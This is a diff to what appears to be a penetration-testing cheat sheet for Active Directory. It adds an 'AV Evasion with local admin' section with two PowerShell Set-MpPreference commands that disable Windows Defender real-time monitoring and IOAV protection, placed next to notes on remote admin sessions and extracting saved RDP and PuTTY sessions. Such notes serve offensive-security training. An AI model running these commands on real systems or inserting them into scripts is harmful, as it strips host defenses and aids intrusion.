@@ -674,6 +674,11 @@ PS C:\Windows\system32> invoke-Command -ScriptBlock {whoami} -Session $sess
 marvel\administrator
 ```
 
+#AV Evasion with local admin:
+```
+Set-MpPreference -DisableIOAVProtection $true
+Set-MpPreference -DisableRealtimeMonitoring $true
+```
 
 # Other
 Extract RDP, Putty sessions form Registry:
